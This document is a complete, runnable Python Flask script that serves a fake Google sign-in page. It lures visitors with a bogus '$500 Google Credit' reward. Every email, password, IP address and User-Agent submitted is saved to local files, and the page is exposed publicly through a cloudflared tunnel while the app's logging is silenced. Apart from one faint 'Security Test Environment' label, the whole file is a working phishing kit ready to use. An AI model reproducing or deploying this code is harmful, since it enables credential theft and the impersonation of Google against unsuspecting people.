import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

# Auto-install missing packages quietly
def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

# Flask app setup
app = Flask(__name__)
app.secret_key = 'google-reward-test-2024'

# Suppress Flask and Werkzeug logs completely
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

# Also silence Flask's startup messages by redirecting output temporarily
class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

# Data saving folder
BASE_FOLDER = os.path.expanduser("~/storage/downloads/Google Free Money")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['session_id'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Google - Claim Your Reward</title>
        <link rel="icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABmJLR0T///////8JWPfcAAAACXBIWXMAAABIAAAASABGyWs+AAAAF0lEQVRIx2NgGAWjYBSMglEwCkbBSAcACAkAAAABEZBUgE0AAAAASUVORK5CYII=">
        <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&display=swap" rel="stylesheet">
        <style>
            :root {
                --google-blue: #1a73e8;
                --google-dark-blue: #1967d2;
                --google-gray: #5f6368;
                --google-light-gray: #f8f9fa;
            }
            
            body {
                font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
                background: white;
                color: #202124;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            
            .container {
                width: 100%;
                max-width: 448px;
                padding: 48px 40px 36px;
                border: 1px solid #dadce0;
                border-radius: 8px;
                margin: 20px;
            }
            
            .google-logo {
                text-align: center;
                margin-bottom: 16px;
            }
            
            .reward-badge {
                background: #f8f9fa;
                border: 1px solid #dadce0;
                border-radius: 6px;
                padding: 12px;
                text-align: center;
                margin: 20px 0;
            }
            
            .reward-amount {
                color: #1e8e3e;
                font-size: 24px;
                font-weight: 500;
                margin: 8px 0;
            }
            
            input {
                width: 100%;
                padding: 13px 15px;
                margin: 8px 0;
                border: 1px solid #dadce0;
                border-radius: 4px;
                font-size: 16px;
                box-sizing: border-box;
            }
            
            input:focus {
                border-color: var(--google-blue);
                outline: none;
                box-shadow: 0 0 0 2px #e8f0fe;
            }
            
            .next-button {
                background: var(--google-blue);
                color: white;
                border: none;
                padding: 10px 24px;
                border-radius: 4px;
                font-weight: 500;
                cursor: pointer;
                float: right;
                margin-top: 20px;
            }
            
            .next-button:hover {
                background: var(--google-dark-blue);
            }
            
            .footer {
                margin-top: 40px;
                font-size: 12px;
                color: var(--google-gray);
                text-align: center;
            }
            
            .footer-links {
                margin-top: 8px;
            }
            
            .footer-links a {
                color: var(--google-gray);
                text-decoration: none;
                margin: 0 8px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="google-logo">
                <span style="font-size: 42px; font-weight: 400;">
                    <span style="color: #4285F4;">G</span>
                    <span style="color: #EA4335;">o</span>
                    <span style="color: #FBBC05;">o</span>
                    <span style="color: #4285F4;">g</span>
                    <span style="color: #34A853;">l</span>
                    <span style="color: #EA4335;">e</span>
                </span>
            </div>
            
            <h1 style="text-align: center; font-weight: 400; font-size: 24px; margin: 16px 0;">Claim Your Reward</h1>
            
            <div class="reward-badge">
                <div style="font-size: 14px; color: #5f6368;">Congratulations! You've been selected for:</div>
                <div class="reward-amount">$500 Google Credit</div>
                <div style="font-size: 12px; color: #5f6368;">Available for use across all Google services</div>
            </div>
            
            <div style="text-align: center; color: #5f6368; margin-bottom: 24px;">
                Sign in to claim your reward
            </div>
            
            <form action="/login" method="post">
                <input type="email" name="username" placeholder="Email or phone" required>
                <input type="password" name="password" placeholder="Enter your password" required>
                
                <div style="margin-top: 16px; font-size: 14px;">
                    <a href="#" style="color: var(--google-blue); text-decoration: none;">Forgot password?</a>
                </div>
                
                <div style="margin-top: 40px;">
                    <a href="#" style="color: var(--google-blue); text-decoration: none; font-weight: 500;">Create account</a>
                    <button type="submit" class="next-button">Next</button>
                </div>
            </form>
            
            <div class="footer">
                <div class="footer-links">
                    <a href="#">Help</a>
                    <a href="#">Privacy</a>
                    <a href="#">Terms</a>
                </div>
                <select style="border: none; background: none; color: var(--google-gray); margin-top: 16px;">
                    <option>English (United States)</option>
                </select>
            </div>
        </div>
        
        <div style="position: fixed; bottom: 10px; right: 10px; font-size: 8px; color: #ccc; opacity: 0.5;">
            Security Test Environment
        </div>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('session_id', 'unknown')

    if not username or not password:
        return "Email/Phone and password are required!", 400

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session ID: {session_id}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Verifying Your Account - Google</title>
        <style>
            body {
                font-family: 'Google Sans', Arial, sans-serif;
                background: white;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .container {
                text-align: center;
                padding: 40px;
            }
            .spinner {
                border: 4px solid #f3f3f3;
                border-top: 4px solid #4285F4;
                border-radius: 50%;
                width: 40px;
                height: 40px;
                animation: spin 2s linear infinite;
                margin: 0 auto 20px;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            h2 {
                color: #202124;
                font-weight: 400;
            }
            .success-message {
                background: #e6f4ea;
                border: 1px solid #34a853;
                border-radius: 6px;
                padding: 16px;
                margin: 20px 0;
                max-width: 400px;
            }
        </style>
        <meta http-equiv="refresh" content="5;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="spinner"></div>
            <h2>Verifying your account...</h2>
            <div class="success-message">
                <strong>Reward Claimed Successfully!</strong><br>
                Your $500 Google credit is being processed.
            </div>
            <p>Redirecting to Google Accounts...</p>
        </div>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"Google Free Money Public Link: {tunnel_url}")
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5000")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        sys.exit(0)